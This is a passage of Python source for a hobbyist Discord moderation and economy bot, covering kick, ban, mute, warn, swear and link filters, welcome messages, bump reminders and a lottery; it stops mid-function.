import asyncio
import os
nextcordtoken = os.environ['token']
import re
from nextcord.ext import commands
from keep_alive import keep_alive
import nextcord
import random
import aiohttp
import requests
import random
from nextcord.utils import get
from nextcord import FFmpegPCMAudio
from youtube_dl import YoutubeDL
from datetime import datetime
intents = nextcord.Intents.all()
client = commands.Bot(command_prefix=".", case_insensitive=True, intents=intents, help_command=None)
seconds = 0

from PIL import Image
#from io import BytesIO
from PIL import ImageFont
from PIL import ImageDraw
from PIL import ImageOps



@client.event
async def on_ready():
  await client.change_presence(status=nextcord.Status.idle)
  #print("------------------------")
  print("")
  print("Bot logged in as",client.user)
  print('Connected to {} servers'.format(len(client.guilds), len(set(client.get_all_members())), client.shard_count))
  print(f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=842525783&scope=applications.commands%20bot")
  print("")
  username = client.get_user(478190340734451714)
  now = datetime.now()
  hour = int(now.strftime("%H"))
  hour += 1
  d1 = now.strftime(f"{hour}:%M:%S, %d/%m/%Y")
  await username.send(f"Bot restarted at {d1}")
  await client.change_presence(activity=nextcord.Activity(type=nextcord.ActivityType.watching, name="a restarting tutorial"))
  for guild in client.guilds:
    try:
      mutedRole = nextcord.utils.get(guild.roles, name="Temp Muted")
    except:
      continue
    while True:
      try:
        mutedRole = nextcord.utils.get(guild.roles, name="Temp Muted")
        await mutedRole.delete()
      except:
        break
    try:
      mutedRole = await guild.create_role(name="Temp Muted")
      print(f"Replaced Temp Muted role in {guild.name}")
    except:
      continue
    try:
      for channel in guild.channels:
        await channel.set_permissions(mutedRole, speak=False, send_messages=False)
    except:
      continue
    try:
      pmutedRole = nextcord.utils.get(guild.roles, name="Muted")
    except:
      continue
    if not pmutedRole:
                pmutedRole = await guild.create_role(name="Muted")
                try:
                  for channel in guild.channels:
                    await channel.set_permissions(pmutedRole, speak=False, send_messages=False)
                  print(f"Added Muted role to {guild.name}")
                except:
                  pass
  while True:
    servers = len(client.guilds)
    channels = sum([len(guild.channels) for guild in client.guilds])
    members = sum([int(guild.member_count) for guild in client.guilds])
    #await client.change_presence(activity=nextcord.Activity(type=nextcord.ActivityType.watching, name=f"{members} users"))
    await client.change_presence(activity=nextcord.Activity(type=nextcord.ActivityType.watching, name=f"cdbots.com"))
    await asyncio.sleep(5)
    for root, dirs, files in os.walk("reminders", topdown=True):
      for name in files:
        f = open(f"reminders/{os.path.join(name)}","r")
        channel = client.get_channel(int(f.read()))
        f.close()
        remindTime = str(os.path.join(name).replace(".txt",""))
        hour = int(datetime.now().strftime('%H'))
        mins = datetime.now().strftime('%M')
        #print(remindTime + " = " + f"{hour}{mins}")
        if remindTime == f"{hour}{mins}":
          await channel.send("Remember to bump the server! @here")
          await channel.send("To turn bump reminders off, do .bumpreminder off")
          os.remove(f"reminders/{os.path.join(name)}")
    try: 
      f = open("lottery/nextlottery.txt","r")
      nextlottery = f.read()
      f.close()
      now = datetime.now()
      hour = int(now.strftime("%H"))
      hour += 1
      d1 = now.strftime(f"{hour}:%M %m")
      if d1 == nextlottery:
        month = int(now.strftime("%m"))
        month += 1
        print("LOTTERY TIME!!!!")
        channel = client.get_channel(892024603843657728)
        f = open("lottery/lotterytotal.txt","r")
        moneys = int(f.read())
        f.close()
        total = int((moneys - 1)/10)
        line = random.randint(1, total-1)
        f = open("lottery/lotterypeople.txt","r")
        lines = f.readlines()
        people = f.read()
        f.close()
        try:
          person = lines[line]
          person = person[0:18]
          author = person
          authorname = client.get_user(int(person))
          word = "wallet"
          person = f"{authorname.name}{word}{author}"
          f = open(f"wallets/{person}.txt", "r")
          winnermoney = int(f.read())
          f.close()
          f = open(f"wallets/{person}.txt", "w")
          f.write(str(winnermoney+(moneys-1)))
          f.close()
          await channel.send(f"{total} lottery tickets were bought at 10 moneys per ticket. <@{person}> won the whole {moneys-1}!")
          await client.change_presence(activity=nextcord.Activity(type=nextcord.ActivityType.watching, name=f"Lottery results are in!"))
        except:
          await channel.send("No one won the lottery this month!")
          await client.change_presence(activity=nextcord.Activity(type=nextcord.ActivityType.watching, name=f"No one won the lottery!"))
        await channel.send("To enter do .enterlottery (amount of tickets) A winner is decided every month!")
        f = open("lottery/lotterypeople.txt","w")
        f.close()
        f = open("lottery/lotterytotal.txt","w")
        f.write("1")
        f.close()
        f = open("lottery/nextlottery.txt","w")
        if month == 13:
          month = 1
        f.write(now.strftime(f"{hour}:%M {month}"))
        f.close()
        await asyncio.sleep(43200)
    except:
      pass

  
#--------------------------

#invite
@client.command()
async def invite(ctx):
  await ctx.send(f"<@{ctx.author.id}>, My invite URL is https://nextcord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=842525783&scope=applications.commands%20bot")

#ping
@client.command(name="ping", description="Pong!")
async def ping(ctx):
    await ctx.send(f"Pong! {client.latency}ms")

#uptime
#@client.command(name="uptime", description="Bot's uptime!")
#async def uptime(ctx):
    #global seconds
    #extra = seconds + 20
    #await ctx.send(f"Bot uptime: Between {seconds}s and {extra}s")

#help
@client.command()
async def help(ctx,other=None):
  if other == None:
    help = nextcord.Embed (
        title = 'Bidoof\'s commands',
        description = '\n **Useful:** \n `.help useful` \n \n **Music:** \n `.help music`\n \n **Fun:**\n `.help fun`\n \n **Moderating:**\n `.help moderating`\n \n **Admin:** \n `.help admin` \n \n **Economy:** \n `.help economy` ',
        colour = nextcord.Colour.orange()
    )
    await ctx.send(embed=help)
  elif other == "economy":
    economy = nextcord.Embed (
        title = 'Bidoof\'s economy commands',
        description = '**Prefix:** `.` \n \n Balance - `bal (user if necessary)` \n Beg for money - `beg` \n Withdraw - `with (all/amount)` \n Deposit - `dep (all/amount)` \n Rob a user - `rob (user)` \n Shop - `shop` \n Buy - `buy (item id)` \n Inventory - `inv` \n Enter lottery - `enterlottery (amount of tickets)`',
        colour = nextcord.Colour.orange()
    )
    await ctx.send(embed=economy)
  elif other == "music":
    music = nextcord.Embed (
        title = 'Bidoof\'s music commands',
        description = '**Prefix:** `.` \n \n Join VC - `join` \n Leave VC - `leave` \n Play from URL - `play (url)` \n Pause - `pause` \n Resume - `resume` \n Stop - `stop`',
        colour = nextcord.Colour.orange()
    )
    await ctx.send(embed=music)
  elif other == "admin":
    admin = nextcord.Embed (
        title = 'Bidoof\'s admin commands',
        description = '**Prefix:** `.` \n \n Kick - `kick (user) (reason)` \n Ban - `ban (user) (reason)` \n Mute - `mute (user) (reason)` \n Unmute - `unmute (user)` \n Tempmute - `tempmute (user) (time s/m/h/d) (reason)` \n Warn - `warn (user) (reason)` \n Check user\'s warns - `check (user)` \n Clear user\'s warn history - `clearhistory (user)` \n Move role - `move role (pos)`',
        colour = nextcord.Colour.orange()
    )
    await ctx.send(embed=admin)
  elif other == "moderating":
    moderating = nextcord.Embed (
        title = 'Bidoof\'s moderating commands',
        description = '**Prefix:** `.` \n \n Roles in the server - `roles` \n Clear messages - `clear (amount)` \n Toggle swear filter - `swearfilter (on/off)` \n Toggle welcome messages - `.welcomes (on/off)` \n Toggle leave messages - `.goodbyes (on/off)` \n Guild id - `guildid` \n  Toggle bump reminder - `bumpreminder (on/off)` \n Toggle link filter `linkfilter (on/off)` \n ',
        colour = nextcord.Colour.orange()
    )
    await ctx.send(embed=moderating)
  elif other == "fun":
    fun = nextcord.Embed (
        title = 'Bidoof\'s fun commands',
        description = '**Prefix:** `.` \n \n Magic 8ball - `8ball` \n Dice roll - `dice` \n Love calculator - `lovecalculator (user 1) (user 2)` \n Coin flip - `coinflip` \n Random meme - `meme` \n Avatar - `avatar (user)` \n Yes or no - `yesorno` \n Stretch avatar - `stretch (user)`',
        colour = nextcord.Colour.orange()
    )
    await ctx.send(embed=fun)
  elif other == "useful":
    useful = nextcord.Embed (
        title = 'Bidoof\'s useful commands',
        description = '**Prefix:** `.` \n \n Poll - `poll (question)` \n Members in your server - `members`',
        colour = nextcord.Colour.orange()
    )
    await ctx.send(embed=useful)
  elif other == "premium":
    premium = nextcord.Embed (
        title = 'Bidoof\'s premium commands',
        description = '**Prefix:** `.` \n \n Toogle leveling - `leveling (on/off)` \n Check your level - `level`',
        colour = nextcord.Colour.orange()
    )
    await ctx.send(embed=premium)
  else:
    await ctx.send(embed=help)


#members
@client.command(name="members", description="See how many people are in your server")
async def members(ctx):
    embedVar = nextcord.Embed(title=f'There Are {ctx.guild.member_count} Members In This Server', color=0xFF0000)
    if ctx.author.id == 478190340734451714:
      try:
        await ctx.message.delete()
      except:
        return
      servers = len(client.guilds)
      channels = sum([len(guild.channels) for guild in client.guilds])
      members = sum([int(guild.member_count) for guild in client.guilds])
      embed = nextcord.Embed(description=f"Watching {members} users", colour=nextcord.Colour.green())
      embed2 = nextcord.Embed(description=f"Watching {channels} channels", colour=nextcord.Colour.green())
      embed3 = nextcord.Embed(description=f"Watching {servers} servers", colour=nextcord.Colour.green())
      embed4 = nextcord.Embed(description=f"{ctx.guild.member_count} members in this server", colour=nextcord.Colour.green())
      await ctx.channel.send(embed=embed, delete_after=20)
      await ctx.channel.send(embed=embed2, delete_after=21)
      await ctx.channel.send(embed=embed3, delete_after=22)
      await ctx.channel.send(embed=embed4, delete_after=25)
    else:
      await ctx.channel.send(embed=embedVar)


#broadcast
@client.command(pass_context=True)
async def broadcast(ctx, *, msg):
  if ctx.author.id == 478190340734451714:
    for server in client.guilds:
        for channel in server.text_channels:
            try:
                embed = nextcord.Embed(description=f"{msg}", colour=nextcord.Colour.green())
                await server.text_channels[0].send(embed=embed)
                await ctx.message.delete()
                await ctx.channel.send(f"Broadcasted **{msg}** to all servers!", delete_after=120)
                print(f"Broadcasted {msg}!")
                print("")
            except Exception:
              break
  else:
    await ctx.channel.send("You have no perms!")

#clear
@client.command()
@commands.has_permissions(manage_messages = True)
async def clear(ctx,amount=2):
  await ctx.channel.purge(limit = amount)
  embed = nextcord.Embed(description=f"✅ Cleared {amount} messages!", colour=nextcord.Colour.green())
  await ctx.send(embed=embed, delete_after=5)

#kick
@client.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx, member : nextcord.Member, *,reason=None):
  guild = ctx.guild
  try: 
    await ctx.message.delete()
    await member.kick(reason=reason)
    await member.send(f" You have been kicked from: **{guild.name}** Reason: **{reason}**")
    print(member,"was kicked")
    kick = nextcord.Embed(title="Kicked", description=f"✅{member.mention} was kicked ", colour=nextcord.Colour.green())
    kick.add_field(name="Reason:", value=reason, inline=False)
    await ctx.send(embed=kick, delete_after=10)
    guild = ctx.guild
    clan = str(ctx.guild.id)
    author = str(ctx.author.id)
    guy = str(member.id)
    person = clan + guy
    f = open(f"playerlogs/{person}.txt", "a")
    f.write("\n")
    f.write(f"'{reason}', kicked by <@{ctx.author.id}>")
    f.close()
  except nextcord.Forbidden:
        await ctx.send(f"Forbidden to kick {member}, move my role to the top of the role list!")

#ban
@client.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member : nextcord.Member, *,reason=None):
  guild = ctx.guild
  try:
    await member.ban(reason=reason)
    await member.send(f" You have been banned from: **{guild.name}** Reason: **{reason}**")
    await ctx.message.delete()
    print(member,"was banned")
    ban = nextcord.Embed(title="Banned", description=f"✅{member.mention} was banned ", colour=nextcord.Colour.green())
    ban.add_field(name="Reason:", value=reason, inline=False)
    await ctx.send(embed=ban, delete_after=10)
    guild = ctx.guild
    clan = str(ctx.guild.id)
    author = str(ctx.author.id)
    guy = str(member.id)
    person = clan + guy
    f = open(f"playerlogs/{person}.txt", "a")
    f.write("\n")
    f.write(f"'{reason}', banned by <@{ctx.author.id}>")
    f.close()
  except nextcord.Forbidden:
        await ctx.send(f"Forbidden to ban {member}, move my role to the top of the role list!")

#mute
@client.command(description="Mutes the specified user.")
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member: nextcord.Member, *, reason=None):
    guild = ctx.guild
    pmutedRole = nextcord.utils.get(guild.roles, name="Muted")

    if not pmutedRole:
        pmutedRole = await guild.create_role(name="Muted")

        for channel in guild.channels:
            await channel.set_permissions(pmutedRole, speak=False, send_messages=False)
    try:
      muting = nextcord.Embed(title="Muted", description=f"✅{member.mention} was muted ", colour=nextcord.Colour.green())
      muting.add_field(name="Reason:", value=reason, inline=False)
      await ctx.send(embed=muting, delete_after=10)
      await ctx.message.delete()
      await member.add_roles(pmutedRole, reason=reason)
      await member.send(f" You have been muted from: **{guild.name}** Reason: **{reason}**")
      guild = ctx.guild
      guy = str(member.id)
      clan = str(ctx.guild.id)
      author = str(ctx.author.id)
      person = clan + guy
      f = open(f"playerlogs/{person}.txt", "a")
      f.write("\n")
      f.write(f"'{reason}', muted by <@{ctx.author.id}>")
      f.close()
    except nextcord.Forbidden:
        await ctx.send(f"Forbidden to mute {member}, move my role to the top of the role list!")


#unmute
@client.command(description="Unmutes a specified user.")
@commands.has_permissions(manage_messages=True)
async def unmute(ctx, member: nextcord.Member):
  pmutedRole = nextcord.utils.get(ctx.guild.roles, name="Muted")
  mutedRole = nextcord.utils.get(ctx.guild.roles, name="Temp Muted")
  try: 
    await member.remove_roles(pmutedRole)
    await member.remove_roles(mutedRole)
    await ctx.message.delete()
    await member.send(f" You have unmuted from: **{ctx.guild.name}**")
    unmute = nextcord.Embed(title="Unmute", description=f"✅ Unmuted {member.mention}",colour=nextcord.Colour.green())
    await ctx.send(embed=unmute, delete_after=10)
  except nextcord.Forbidden:
        await ctx.send(f"Forbidden to unmute {member}, move my role to the top of the role list!")



#join event
@client.event
async def on_guild_join(guild):
    print("")
    print("----------")
    print("")
    print("+1 Guild")
    print("")
    print("----------")
    print("")
    join = nextcord.Embed(title="✅ Joined", description=f"Thank you for adding me! Do .help to see all the commands I can do!",colour=nextcord.Colour.green())
    await guild.text_channels[0].send(embed = join)
    
#guild id
@client.command()
async def guildid(ctx):
  id = str(ctx.guild.id)
  await ctx.channel.send(f"Your guild id is: {id}")

#checkwarnings
@client.command()
async def check(ctx, member: nextcord.Member):
  guild = str(ctx.guild.id)
  author = str(ctx.author.id)
  guy = str(member.id)
  person = guild + guy
  try:
    try:
      with open(f"playerlogs/{person}.txt", 'r') as file :
        filedata = file.read()
      with open(f"playerlogs/{person}.txt", 'w') as file:
        file.write(filedata)
      await ctx.channel.send(filedata)
    except:
      await ctx.channel.send(f"**{member}** has never been warned on this server")
  except:
    await ctx.channel.send("An error has occurred")

#warn
@client.command()
@commands.has_permissions(manage_roles=True)
async def warn(ctx, member : nextcord.Member, *, reason=None):
    guild = ctx.guild
    clan = str(ctx.guild.id)
    author = str(ctx.author.id)
    guy = str(member.id)
    person = clan + guy
    warn1Role = nextcord.utils.get(guild.roles, name="First warning")
    warn2Role = nextcord.utils.get(guild.roles, name="Second warning")
    warn3Role = nextcord.utils.get(guild.roles, name="Third warning")
    warn4Role = nextcord.utils.get(guild.roles, name="Fourth warning")
    warn5Role = nextcord.utils.get(guild.roles, name="5+ warnings")
    warn = nextcord.Embed(title="Warned", description=f"{member.mention} was warned ", colour=nextcord.Colour.light_gray())
    warn.add_field(name="Reason:", value=reason, inline=False)
    try:
      f = open(f"playerlogs/{person}.txt", "a")
      f.write("\n")
      f.write(f"'{reason}', warned by <@{ctx.author.id}>")
      f.close()
      await ctx.message.delete()
      await ctx.send(embed=warn, delete_after=20)
      await member.send(f" You have been warned on: **{guild.name}** Reason: **{reason}**")
      print(member,"was warned")
      if not warn1Role:
        warn1Role = await guild.create_role(name="First warning")
      if not warn2Role:
        warn2Role = await guild.create_role(name="Second warning")
      if not warn3Role:
        warn3Role = await guild.create_role(name="Third warning")
      if not warn4Role:
        warn4Role = await guild.create_role(name="Fourth warning")
      if not warn5Role:
        warn5Role = await guild.create_role(name="5+ warnings")
      while True:
        if not warn1Role in member.roles:
              await member.add_roles(warn1Role, reason=reason)
              break
        if warn1Role in member.roles:
              await member.add_roles(warn2Role, reason=reason)
              await member.remove_roles(warn1Role)
              break
        if warn2Role in member.roles:
              await member.add_roles(warn3Role, reason=reason)
              await member.remove_roles(warn2Role)
              await member.remove_roles(warn1Role)
              break
        if warn3Role in member.roles:
              await member.add_roles(warn4Role, reason=reason)
              await member.remove_roles(warn3Role)
              await member.remove_roles(warn1Role)
              break
              
        if warn4Role in member.roles:
              await member.add_roles(warn5Role, reason=reason)
              await member.remove_roles(warn4Role)
              break
              
        if warn5Role in member.roles:
              await member.remove_roles(warn1Role)
              break
    except nextcord.Forbidden:
          await ctx.send(f"Forbidden to warn {member}, move my role to the top of the role list!")
          

#clear database for person
@client.command()
@commands.has_permissions(manage_roles=True)
async def clearhistory(ctx, member : nextcord.Member):
  guild = ctx.guild
  clan = str(ctx.guild.id)
  author = str(ctx.author.id)
  guy = str(member.id)
  person = clan + guy
  warn1Role = nextcord.utils.get(guild.roles, name="First warning")
  warn2Role = nextcord.utils.get(guild.roles, name="Second warning")
  warn3Role = nextcord.utils.get(guild.roles, name="Third warning")
  warn4Role = nextcord.utils.get(guild.roles, name="Fourth warning")
  warn5Role = nextcord.utils.get(guild.roles, name="5+ warnings")
  try:
    try:
      await member.remove_roles(warn1Role)
    except:
      return
    try:
      await member.remove_roles(warn2Role)
    except:
      return
    try:
      await member.remove_roles(warn3Role)
    except:
      return
    try:
      await member.remove_roles(warn4Role)
    except:
      return
    try:
      await member.remove_roles(warn5Role)
    except:
      return
    await ctx.message.delete()
    await ctx.send(f"Cleared warnings for **{member}**!", delete_after=30)
    await member.send(f" Your warnings have be cleared on **{guild.name}**")
    os.remove(f"playerlogs/{person}.txt")
  except:
    await ctx.send("An error occured")


  
#tempmute
@client.command()
@commands.has_permissions(manage_messages=True)
async def tempmute(ctx, member: nextcord.Member,time,*,reason=None):
    guild = ctx.guild
    mutedRole = nextcord.utils.get(ctx.guild.roles, name="Temp Muted")
    try:
      tempmutedm = nextcord.Embed(description=f"You are muted on: **{guild.name}** Reason: **{reason}** Time: **{time}**",colour=nextcord.Colour.red())
      await member.send(embed=tempmutedm)
      if not mutedRole:
        mutedRole = await guild.create_role(name="Temp Muted")

        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak=False, send_messages=False)
      time_convert = {"s":1, "m":60, "h":3600,"d":86400}
      tmute = int(time[0]) * time_convert[time[-1]]
      if not mutedRole in member.roles:
        await member.add_roles(mutedRole)
      tempm = nextcord.Embed(description= f"✅ **{member.display_name}#{member.discriminator} muted successfuly**", color = nextcord.Color.green())
      await ctx.send(embed=tempm, delete_after=10)
      await ctx.message.delete()
      guild = ctx.guild
      clan = str(ctx.guild.id)
      author = str(ctx.author.id)
      guy = str(member.id)
      person = clan + guy
      f = open(f"playerlogs/{person}.txt", "a")
      f.write("\n")
      f.write(f"'{reason}', temp muted by <@{author}> for {time}")
      f.close()
      await asyncio.sleep(tmute)
      await member.remove_roles(mutedRole)
    except nextcord.Forbidden:
        await ctx.send(f"Forbidden to tempmute {member}, move my role to the top of the role list!")

#on message
@client.event
async def on_message(message):
  if message.author.id != client.user.id:
    name = str(message.guild)
    with open('BadWords.txt') as file:
      file = file.read().split()
    f = open("swear.txt", "a")
    f.close()
    with open("swear.txt", "r") as f:
      if not message.author.bot:
        searching = re.compile(r'\b({0})\b'.format(message.guild.id), flags=re.IGNORECASE).search
        while True:
              line = f.readline()
              if not line:
                break
              if searching(line):
                if not message.author.bot:
                  for badword in file:
                    if badword in message.content.lower():
                      await message.delete()
                      print("Filtered swear")
                      await message.channel.send(f'{message.author.mention}! Please do not swear on this server.', delete_after=10)
                      clan = str(message.guild.id)
                      guy = str(message.author.id)
                      person = clan + guy
                      f = open(f"playerlogs/{person}.txt", "a")
                      f.write("\n")
                      f.write(f"'{badword}', swore in <#{message.channel.id}>")
                      f.close()
                      await message.author.send(f"Please do not swear on **{name}**.")
                      return
    f = open("bump.txt", "a")
    f.close()
    with open("bump.txt", "r") as f:
      if str(message.author.id) == "302050872383242240":
            data = f.read()
            tests = data.count(str(message.guild.id))
            if tests == 0:
                if message.author.bot:
                      if "Bump done!" in message.embeds[0].description: 
                        await message.add_reaction(emoji='⏱️')
                        await message.channel.send("Thanks for bumping the server! I will remind you in 2 hours!")
                        hour = int(datetime.now().strftime('%H'))
                        mins = datetime.now().strftime('%M')
                        if hour+2 == 25:
                          remindTime = f"{1}{mins}"
                        remindTime = f"{hour+2}{mins}"
                        f = open(f"reminders/{remindTime}.txt", "x")
                        f = open(f"reminders/{remindTime}.txt", "a")
                        f.write(f"{message.channel.id}")
                        f.close()
    if message.author.id == 478190340734451714:
      try:
        await message.add_reaction('🥝')
      except:
        pass
    if message.content.startswith('.poll'):
      await message.add_reaction('👍')
      await message.add_reaction('👎')
    f = open("premium.txt", "a")
    with open("premium.txt", "r") as f:
              name = str(message.guild)
              data = f. read()
              tests = data.count(str(message.guild.id))
              if tests>10:
                with open("leveling.txt", "r") as f:
                  if not message.author.bot:
                          data = f. read()
                          tests = data.count(str(message.guild.id))
                          if tests>0:
                            clan = str(message.guild.id)
                            author = str(message.author.id)
                            authorname = str(message.author.name)
                            word = "level"
                            person = authorname + word + clan + author 
                            if not message.author.bot:
                              try:
                                file = open(f"levels/{person}.txt", "x")
                              except:
                                pass
                              file = open(f"levels/{person}.txt", "a")
                              with open(f"levels/{person}.txt", 'r') as file:
                                  filedata = file.read()
                              file = open(f"levels/{person}.txt", 'w')
                              file.write(filedata)
                              data = filedata
                              if data == "":
                                  q = open(f"levels/{person}.txt", "a")
                                  q.write("0")
                              try:
                                  file = open(f"levels/{person}.txt", 'w')
                                  file.write(filedata)
                                  level = filedata
                                  newlevel = float(level) + 0.1
                                  levelnew = str(newlevel)
                                  fullstring = levelnew
                                  substring = ".0"

                                  if substring in fullstring:
                                    number = int(newlevel)
                                    finallevel = str(number)
                                    os.remove(f"levels/{person}.txt")
                                    g = open(f"levels/{person}.txt", "a")
                                    g.write(finallevel)
                                    g.close()
                                    await message.channel.send(f"Congrats, {message.author.name}! You are now level {finallevel}!")
                                  else:
                                    os.remove(f"levels/{person}.txt")
                                    g = open(f"levels/{person}.txt", "a")
                                    g.write(levelnew)
                                    g.close()
                              except:
                                pass
                              if os.path.exists(f"levels/{person}.txt"):
                                pass
                              else:
                                await message.channel.send(f"This is your first time talking, {message.author.name}!")
    if not message.author.bot and str(message.guild.owner.id) != str(message.author.id):
      f = open("links.txt","r")
      data = f.read()
      print(str(message.guild.owner.id))
      f.close()
      if "https://" in str(message.content.lower()) or "http://" in str(message.content.lower()):
        if str(message.guild.id) in data:
          await message.delete()
          clan = str(message.guild.id)
          guy = str(message.author.id)
          person = clan + guy
          f = open(f"playerlogs/{person}.txt", "a")
          f.write("\n")
          f.write(f"'{message.content.lower()}', posted link in <#{message.channel.id}>")
          f.close()
          await message.channel.send(f"{message.author.mention} links are not allowed in **{message.guild}**")
          owner = client.get_user(int(message.guild.owner.id))
          await owner.send(f"{message.author.mention} sent {str(message.content.lower())} (a link) in <#{message.channel.id}>")
  await client.process_commands(message)




#level check
@client.command()
async def level(ctx):
  f = open("premium.txt", "a")
  with open("premium.txt", "r") as f:
                                    data = f. read()
                                    tests = data.count(str(ctx.guild.id))
                              
                                    name = str(ctx.guild)
                                    if tests == 0:
                                      await ctx.channel.send("This is not a premium server! For help about premium, do .help premium")
                                      
                                    else:
                                      f = open("leveling.txt", "a")
                                      with open("leveling.txt", "r") as f:
                                        data = f. read()
                                        tests = data.count(str(ctx.guild.id))
                                        searching = re.compile(r'\b({0})\b'.format(ctx.guild.id), flags=re.IGNORECASE).search
                                        line = f.readline()
                                        if tests == 0:
                                          await ctx.channel.send(f"Leveling is not enabled on {ctx.guild}")
                                          
                                        if tests > 0:
                                          clan = str(ctx.guild.id)
                                          author = str(ctx.author.id)
                                          authorname = str(ctx.author.name)
                                          word = "level"
                                          person = authorname + word + clan + author 
                                          try:
                                            q = open(f"levels/{person}.txt", "x")
                                          except:
                                            pass
                                          file = open(f"levels/{person}.txt", "r")
                                          filedata = file.read()
                                          if ".0" in filedata:
                                                              level = filedata.replace(".0","")
                                                              await ctx.channel.send(f"{ctx.author.mention}, you are level {level}!")
                                                              
                                              
                                          else:
                                                              level = round(float(filedata),1)
                                                              if ".0" in str(level):
                                                                lev = str(level).replace(".0","")
                                                              else:
                                                                lev = level
                                                              await ctx.channel.send(f"{ctx.author.mention}, you are level {lev}!")
                                                          
                                      
                                      

#toggle leveling
@client.command()
async def leveling(ctx, toggle=None):
  f = open("premium.txt", "a")
  with open("premium.txt", "r") as f:
      searching = re.compile(r'\b({0})\b'.format(ctx.guild.id), flags=re.IGNORECASE).search
      while True:
            name = str(ctx.guild)
            line = f.readline()
            if not line:
              print("Not a premium server")
              await ctx.channel.send("This is not a premium server! For help about premium, do .help premium")
              break
            if searching(line):
              f = open("leveling.txt", "a")
              with open("leveling.txt", "r") as f:
                if toggle == "on":
                              searching = re.compile(r'\b({0})\b'.format(ctx.guild.id), flags=re.IGNORECASE).search
                              while True:
                                    line = f.readline()
                                    if not line:
                                      break
                                    if searching(line):
                                      await ctx.send(f"**{name}** already has welcome messages enabled!")
                                      return
                              else:
                                print("not anymore")
                              f = open("leveling.txt", "a")
                              id = str(ctx.guild.id)
                              f.write(id)
                              f.write("\n")
                              f.close()
                              await ctx.send(f"👍 Enabled leveling messages on **{name}**!")
                              break
                elif toggle == "off":
                  id = str(ctx.guild.id)
                  with open('leveling.txt', 'r') as file :
                    filedata = file.read()

                  filedata = filedata.replace(id, '')

 
                  with open('leveling.txt', 'w') as file:
                    file.write(filedata)
                    await ctx.send(f"👍 Disabled leveling on **{name}**!")
                  break




   


#on member join
@client.event
async def on_member_join(member):
  name = str(member.guild)
  id = str(member.guild.id)
  word = "welcomechannel"
  serverchannel = word + id

  file = open('welcome.txt',"r")
  file = file.read()
  with open("welcome.txt", "r") as f:
    while True:
            if not str(member.guild.id) in file:
              print(f"{member.name} joined {name} but no welcome message")
              break
            elif str(member.guild.id) in file:
              for server in file:
                  f = open(f"welcomechannels/{serverchannel}.txt", "a")
                  file = open(f"welcomechannels/{serverchannel}.txt", 'r') 
                  filedata = file.read()
                  welcomechannel = int(filedata)
                  if server in str(member.guild.id):
                    print(f"{member.name} joined {name} with a welcome message")
                    hi = client.get_channel(welcomechannel)
                    embed=nextcord.Embed(title=f"Welcome **{member.name}**", description=f"Thanks for joining **{member.guild.name}**!", colour=nextcord.Colour.green()) # F-Strings!
                    embed.set_thumbnail(url=member.display_avatar.url) # Set the embed's thumbnail to the member's avatar image!
                    embed.set_footer(text = f"Member #{member.guild.member_count}")
                    await hi.send(embed=embed)
                    break
                  break
            break

#on member leave/kick
@client.event
async def on_member_remove(member):
  name = str(member.guild)
  id = str(member.guild.id)
  word = "goodbyechannel"
  serverchannel = word + id

  with open("goodbye.txt", "r") as f:
    while True:
            try:
              line = f.readline()
              data = f.read()
            except:
              continue 
            f = open('goodbye.txt',"r")
            file = f.read()
            f.close()
            if not str(member.guild.id) in file:
              print(f"{member.name} left {name} but no goodbye message")
              break
            elif str(member.guild.id) in file:
              for server in file:
                  with open(f"goodbyechannels/{serverchannel}.txt", 'r') as file :
                    filedata = file.read()
                  with open(f"goodbyechannels/{serverchannel}.txt", 'w') as file:
                    file.write(filedata)
                  welcomechannel = int(filedata)
                  if server in str(member.guild.id):
                    print(f"{member.name} left {name} with a goodbye message")
                    hi = client.get_channel(welcomechannel)
                    embed=nextcord.Embed(title=f"Goodbye **{member.name}**", description=f"Sorry to see you leave **{member.guild.name}**!", colour=nextcord.Colour.green()) # F-Strings!
                    embed.set_thumbnail(url=member.display_avatar.url) # Set the embed's thumbnail to the member's avatar image!
                    await hi.send(embed=embed)
                    break
                  break
            break

#toggle welcome messages
@client.command()
@commands.has_permissions(manage_messages = True)
async def welcomes(ctx,welcomez=None):
  if welcomez == "on":
      name = str(ctx.guild)
      id = str(ctx.guild.id)
      word = "welcomechannel"
      serverchannel = word + id
      f = open("welcome.txt", "a")
      with open("welcome.txt", "r") as f:
        searching = re.compile(r'\b({0})\b'.format(ctx.guild.id), flags=re.IGNORECASE).search
        while True:
              line = f.readline()
              if not line:
                break
              if searching(line):
                await ctx.send(f"**{name}** already has welcome messages enabled!")
                break
      try:
          f = open(f"welcomechannels/{serverchannel}.txt", "x")
          f = open("welcome.txt", "a")
          f.write(id)
          f.write("\n")
          f.close()
          g = open(f"welcomechannels/{serverchannel}.txt", "a")
          g.write(ctx.channel.id)
          g.write("")
          g.close()
          await ctx.send(f"👍 Enabled welcome messages on **{name}**!")
      except:
        await ctx.send(f"Welcome messages are already enabled on **{name}**!")
  elif welcomez == "off":
    id = str(ctx.guild.id)
    word = "welcomechannel"
    serverchannel = word + id
    name = str(ctx.guild)
    try:
      os.remove(f"welcomechannels/{serverchannel}.txt")
    except:
      await ctx.send(f"Welcome messages are already disabled on **{name}**!")
      return
    with open('welcome.txt', 'r') as file :
      filedata = file.read()

    filedata = filedata.replace(id, '')

    with open('welcome.txt', 'w') as file:
      file.write(filedata)
    await ctx.send(f"👍 Disabled welcome messages on **{name}**!")
  else:
    await ctx.send(f"Make sure to put 'on' or 'off' instead of '{welcomez}'")

#enable leave messages
@client.command()
@commands.has_permissions(manage_messages = True)
async def goodbyes(ctx,goodbyez=None):
  if goodbyez == "on":
      name = str(ctx.guild)
      id = str(ctx.guild.id)
      word = "goodbyechannel"
      serverchannel = word + id
      f = open("goodbye.txt", "a")
      with open("goodbye.txt", "r") as f:
        searching = re.compile(r'\b({0})\b'.format(ctx.guild.id), flags=re.IGNORECASE).search
        while True:
              line = f.readline()
              if not line:
                break
              if searching(line):
                await ctx.send(f"**{name}** already has goodbye messages enabled!")
                return
      try:
          f = open(f"goodbyechannels/{serverchannel}.txt", "x")
          f = open("goodbye.txt", "a")
          f.write(id)
          f.write("\n")
          f.close()
          g = open(f"goodbyechannels/{serverchannel}.txt", "a")
          g.write(ctx.channel.id)
          g.write("")
          g.close()
          await ctx.send(f"👍 Enabled leave messages on **{name}**!")
      except:
